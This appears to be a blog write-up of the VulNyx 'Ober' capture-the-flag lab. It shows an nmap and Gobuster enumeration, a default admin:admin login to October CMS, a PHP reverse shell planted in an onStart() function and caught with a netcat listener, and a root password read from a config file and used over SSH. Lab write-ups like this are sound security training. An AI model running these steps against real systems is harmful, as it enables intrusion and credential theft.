---
title: VulNyx - Ober Writeup
date: 2025-05-14 10:24:59 +0530
categories: [Vulnyx]
tags: [vulnyx]
show_image_post: true
image: /assets/img/ober.png
---

Hey everyone! This write-up covers the challenge “Ober” which was released on [VulNyx](https://vulnyx.com/). The box is rated easy and is an excellent challenge for those looking to start out. 

## Reconnaissance

```bash
labs/vulnyx/Ober 
❯ nmap -sC -sV -oA ober 192.168.25.6
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-05-04 09:11 EDT
Nmap scan report for ober.vl (192.168.25.6)
Host is up (0.000068s latency).
Not shown: 997 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 27:21:9e:b5:39:63:e9:1f:2c:b2:6b:d3:3a:5f:31:7b (RSA)
|   256 bf:90:8a:a5:d7:e5:de:89:e6:1a:36:a1:93:40:18:57 (ECDSA)
|_  256 95:1f:32:95:78:08:50:45:cd:8c:7c:71:4a:d4:6c:1c (ED25519)
80/tcp   open  http    Apache httpd 2.4.38 ((Debian))
|_http-title: Homepage &#124; My new websites
|_http-server-header: Apache/2.4.38 (Debian)
8080/tcp open  http    Apache httpd 2.4.38 ((Debian))
|_http-server-header: Apache/2.4.38 (Debian)
|_http-open-proxy: Proxy might be redirecting requests
|_http-title: Site doesn't have a title (text/html).
MAC Address: 08:00:27:B2:AF:E6 (Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.69 seconds

```

### Port 80 - HTTP

```bash
80/tcp   open  http    Apache httpd 2.4.38 ((Debian))
|_http-title: Homepage &#124; My new websites
|_http-server-header: Apache/2.4.38 (Debian)
```

The main webpage did not contain anything interesting. However, performing directory enumeration using Gobuster revealed an *October CMS Administration login page*.  

## Directory Enumeration
### Gobuster

```bash
labs/vulnyx/Ober 
❯ sudo ./gobuster dir -u http://192.168.25.6 -w /usr/share/wordlists/dirb/common.txt -e -b 403,404
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.25.6
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404,403
[+] User Agent:              gobuster/3.6
[+] Expanded:                true
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
http://192.168.25.6/0                    (Status: 200) [Size: 9895]
http://192.168.25.6/backend              (Status: 302) [Size: 406] [--> http://192.168.25.6/backend/backend/auth]
http://192.168.25.6/config               (Status: 301) [Size: 313] [--> http://192.168.25.6/config/]
http://192.168.25.6/index.php            (Status: 200) [Size: 9895]
http://192.168.25.6/modules              (Status: 301) [Size: 314] [--> http://192.168.25.6/modules/]
http://192.168.25.6/plugins              (Status: 301) [Size: 314] [--> http://192.168.25.6/plugins/]
http://192.168.25.6/storage              (Status: 301) [Size: 314] [--> http://192.168.25.6/storage/]
http://192.168.25.6/themes               (Status: 301) [Size: 313] [--> http://192.168.25.6/themes/]
http://192.168.25.6/vendor               (Status: 301) [Size: 313] [--> http://192.168.25.6/vendor/]
Progress: 4614 / 4615 (99.98%)
===============================================================
Finished
===============================================================                                                                      
```
<br>
I was able to discover the October CMS Administration login page found in `/backend/backend/auth/signin`

<center>
<figure>
<img src="/assets/img/october_cms_login.png" style="width: 500px;" alt="October CMS Administration login page">
<figcaption>Fig.1 - October CMS Administration login page</figcaption>
</figure>
</center>

I tested commonly used default credentials which resulted in a successful login using the credentials `admin:admin`

## Shell

October CMS allows PHP execution via functions such as *`onStart()`* (See [docs](https://docs.octobercms.com/2.x/cms/pages.html#page-execution-life-cycle)). This allows us to include a PHP reverse shell the function *onStart()*.

<center>
<figure>
<img src="/assets/img/october_cms_php_shell.png" style="width: 1000px;" alt="PHP reverse shell included within the function onStart()">
<figcaption>Fig.2 - PHP reverse shell included within the function onStart()</figcaption>
</figure>
</center>
<br>

```bash
labs/vulnyx/Ober 
❯ nc -lnvp 1234
listening on [any] 1234 ...
connect to [192.168.25.4] from (UNKNOWN) [192.168.25.6] 56302
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

## Root access

The [docs](https://docs.octobercms.com/2.x/database/basics.html#configuration) mention a database configuration file can be found in `/config/database.php` which upon inspection, led to the discovery of the root-level credentials `root:r00tP@ssW0rd`

```bash
> grep "password" database.php
            'password'   => 'root',
         // 'password'   => 'r00tP@ssW0rd',
            'password' => '',
            'password' => '',
            'password' => null,
```

## User Flag

```bash
root@ober:~# find / -name user.txt
/home/c0w/user.txt
root@ober:~# cat /home/c0w/user.txt 
7597****************************
```

## Root Flag

```bash
labs/vulnyx/Ober 
❯ ssh root@192.168.25.6
The authenticity of host '192.168.25.6 (192.168.25.6)' can't be established.
ED25519 key fingerprint is SHA256:YZj1kF9uAadJk+aLh9kjKOFN5ohREbSGoCGqU4hA1w4.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.25.6' (ED25519) to the list of known hosts.
root@192.168.25.6's password: 
root@ober:~# ls
root.txt
root@ober:~# cat root.txt 
5dfc****************************
```